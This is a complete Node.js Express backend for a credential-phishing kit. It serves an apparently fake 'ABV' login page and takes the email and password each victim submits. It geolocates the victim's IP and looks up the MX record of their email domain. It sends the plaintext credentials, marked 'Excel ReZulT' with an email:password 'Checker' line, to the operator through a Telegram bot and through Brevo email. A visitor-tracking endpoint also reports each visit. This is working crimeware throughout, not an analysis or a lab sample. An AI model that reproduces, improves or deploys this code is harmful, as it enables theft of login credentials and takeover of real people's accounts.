const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// MIDDLEWARE
// ============================================================

app.use(cors({
    origin: 'https://abv-login.netlify.app',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// TELEGRAM CONFIGURATION
// ============================================================

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ============================================================
// BREVO (EMAIL) CONFIGURATION
// ============================================================

const BREVO_API_KEY = process.env.BREVO_API_KEY;
const SENDER_EMAIL = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
const SENDER_NAME = process.env.SENDER_NAME || 'ABV Monitor';

const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
    .split(',')
    .map(e => e.trim())
    .filter(Boolean);

// ============================================================
// STARTUP CONFIG CHECK
// ============================================================

console.log('========================================');
console.log('🔍 Environment check:');
console.log(`   TELEGRAM_BOT_TOKEN: ${BOT_TOKEN ? '✅' : '❌ MISSING'}`);
console.log(`   TELEGRAM_CHAT_ID:   ${CHAT_ID ? '✅' : '❌ MISSING'}`);
console.log(`   BREVO_API_KEY:      ${BREVO_API_KEY ? '✅' : '❌ MISSING'}`);
console.log(`   SENDER_EMAIL:       ${SENDER_EMAIL}`);
console.log(`   EMAIL_RECIPIENTS:   ${EMAIL_RECIPIENTS.length ? '✅ ' + EMAIL_RECIPIENTS.length + ' recipient(s)' : '❌ MISSING'}`);
console.log('========================================');

// ============================================================
// HELPER: Send Email via Brevo (WITH MX RECORD)
// ============================================================

async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord) {
    if (!BREVO_API_KEY) {
        console.log('⚠️ Brevo API key missing, skipping email');
        return false;
    }
    if (EMAIL_RECIPIENTS.length === 0) {
        console.log('⚠️ No email recipients configured, skipping email');
        return false;
    }

    const subject = `🔐 ABV Login Credentials - ${email}`;

    const htmlContent = `
    <!DOCTYPE html>
    <html>
    <head>
        <style>
            body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
            .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .header { background: #1e930c; color: #fff; padding: 15px; border-radius: 5px 5px 0 0; text-align: center; }
            .content { padding: 20px; }
            .field { margin: 10px 0; padding: 10px; background: #f8f8f8; border-radius: 5px; }
            .label { font-weight: bold; color: #555; }
            .value { color: #1e930c; font-size: 16px; }
            .mx { color: #1e930c; font-size: 14px; white-space: pre-line; font-family: monospace; }
            .footer { text-align: center; padding: 15px; color: #999; font-size: 12px; border-top: 1px solid #eee; margin-top: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header"><h2>🔐 ABV Login Credentials</h2></div>
            <div class="content">
                <div class="field"><div class="label">📧 Email:</div><div class="value"><strong>${email}</strong></div></div>
                <div class="field"><div class="label">🔑 Password:</div><div class="value"><strong>${password}</strong></div></div>
                <div class="field"><div class="label">🌐 Domain:</div><div class="value">${domain || 'Unknown'}</div></div>
                <div class="field"><div class="label">📨 MX Record:</div><div class="value mx">${mxRecord || 'Unknown'}</div></div>
                <div class="field"><div class="label">🌍 IP Address:</div><div class="value">${ipInfo?.ip || 'Unknown'}</div></div>
                <div class="field"><div class="label">📍 Location:</div><div class="value">${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}</div></div>
                <div class="field"><div class="label">📱 Browser:</div><div class="value">${userAgent?.substring(0, 100) || 'Unknown'}...</div></div>
                <div class="field"><div class="label">🕐 Time:</div><div class="value">${new Date().toLocaleString()}</div></div>
            </div>
            <div class="footer"><p>© ${new Date().getFullYear()} ABV Monitor</p></div>
        </div>
    </body>
    </html>
    `;

    const textContent = `
🔐 ABV Login Credentials
════════════════════════════════════
📧 Email: ${email}
🔑 Password: ${password}
🌐 Domain: ${domain || 'Unknown'}
📨 MX Record: ${mxRecord || 'Unknown'}
🌍 IP Address: ${ipInfo?.ip || 'Unknown'}
📍 Location: ${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}
📱 Browser: ${userAgent?.substring(0, 100) || 'Unknown'}...
🕐 Time: ${new Date().toLocaleString()}
════════════════════════════════════
    `;

    try {
        const response = await fetch('https://api.brevo.com/v3/smtp/email', {
            method: 'POST',
            headers: {
                'api-key': BREVO_API_KEY,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                sender: { name: SENDER_NAME, email: SENDER_EMAIL },
                to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
                subject: subject,
                htmlContent: htmlContent,
                textContent: textContent
            })
        });

        const data = await response.json();

        if (response.ok) {
            console.log('✅ Email sent via Brevo:', data.messageId || 'sent');
            return true;
        } else {
            console.error('❌ Brevo API error:', response.status, data.message || data.error || JSON.stringify(data));
            return false;
        }
    } catch (error) {
        console.error('❌ Failed to send email via Brevo:', error.message);
        return false;
    }
}

// ============================================================
// HELPER: Send to Telegram (WITH MX RECORD)
// ============================================================

async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('⚠️ Telegram not configured, skipping');
        return null;
    }
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });
        const result = await response.json();
        console.log('📤 Telegram:', result.ok ? '✅ Sent' : '❌ Failed — ' + (result.description || ''));
        return result;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return null;
    }
}

// ============================================================
// HELPER: Get IP info
// ============================================================

async function getIPInfo(ip) {
    try {
        const firstIP = (ip || '').split(',')[0].trim();
        const response = await fetch(`https://ipinfo.io/${firstIP}/json`);
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('❌ IP info error:', error.message);
        return { ip: ip || 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
    }
}

// ============================================================
// HELPER: Get MX Record
// ============================================================

async function getMXRecord(domain) {
    try {
        const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const data = await response.json();
        if (data && data.Answer && data.Answer.length > 0) {
            return data.Answer.map(r => r.data).join('\n');
        }
        return 'no-mx';
    } catch (error) {
        return 'MX-Error';
    }
}

// ============================================================
// HEALTH CHECK
// ============================================================

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        telegramConfigured: !!(BOT_TOKEN && CHAT_ID),
        emailConfigured: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length)
    });
});

// ============================================================
// MAIN LOGIN ENDPOINT
// ============================================================

app.post('/api/login', async (req, res) => {
    console.log('📧 Login attempt received');
    console.log('📋 Request body:', req.body);

    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email and password are required' });
    }

    const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({ success: false, message: 'Invalid email format' });
    }

    console.log(`📧 Email: ${email}`);
    console.log(`🔑 Password: ${password ? '******' : '(empty)'}`);

    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
    console.log(`🌐 IP: ${clientIP}`);

    const ipInfo = await getIPInfo(clientIP);
    console.log(`📍 Location: ${ipInfo.city || 'Unknown'}, ${ipInfo.country || 'Unknown'}`);

    const domain = email.split('@')[1];
    const mxRecord = await getMXRecord(domain);
    console.log(`🌐 Domain: ${domain} | MX: ${mxRecord.split('\n')[0]}`);

    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';

    // ============================================================
    // 1) TELEGRAM MESSAGE (includes MX Record)
    // ============================================================

    const telegramMessage = `
--------+ Excel ReZulT ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +--------
Email : ${email}
Password : ${password}
Checker: ${email}:${password}
Browser : ${userAgent}
Language : ${acceptLanguage}
MX Record : ${mxRecord}
IP Address : ${clientIP}
Region and Country : ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}
Date : ${new Date().toISOString()}
---------+ Excel ReZulT ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +-------------
`;

    console.log('📤 Sending to Telegram...');
    const telegramResult = await sendToTelegram(telegramMessage);

    // ============================================================
    // 2) EMAIL (includes MX Record)
    // ============================================================

    console.log('📧 Sending email via Brevo...');
    const emailResult = await sendEmail(email, password, ipInfo, userAgent, domain, mxRecord);

    // ============================================================
    // RESPONSE
    // ============================================================

    const telegramOK = !!(telegramResult && telegramResult.ok);
    if (telegramOK || emailResult) {
        console.log('✅ Notifications sent successfully');
        return res.json({
            success: true,
            message: 'Login processed successfully',
            notifications: { telegram: telegramOK, email: emailResult }
        });
    } else {
        console.log('❌ Failed to send notifications');
        return res.status(500).json({
            success: false,
            message: 'Failed to send notifications'
        });
    }
});

// ============================================================
// LOGGER ENDPOINT
// ============================================================

app.post('/api/log', async (req, res) => {
    const { email } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
    const ipInfo = await getIPInfo(clientIP);

    const message = `
--------+ Visitor Excel ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} at ${new Date().toISOString()} +--------
Email : ${email || 'Unknown'}
Browser : ${userAgent}
Language : ${acceptLanguage}
IP Address : ${clientIP}
---------+ Excel Visitor ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +-------------
`;
    await sendToTelegram(message);
    res.json({ success: true });
});

// ============================================================
// 404
// ============================================================

app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        message: `Endpoint not found: ${req.method} ${req.originalUrl}`
    });
});

// ============================================================
// START SERVER
// ============================================================

app.listen(PORT, () => {
    console.log('========================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🌐 Health: http://localhost:${PORT}/health`);
    console.log(`📧 Login:  http://localhost:${PORT}/api/login`);
    console.log('========================================');
});

process.on('uncaughtException', (err) => console.error('❌ Uncaught:', err.message));
process.on('unhandledRejection', (r) => console.error('❌ Unhandled:', r));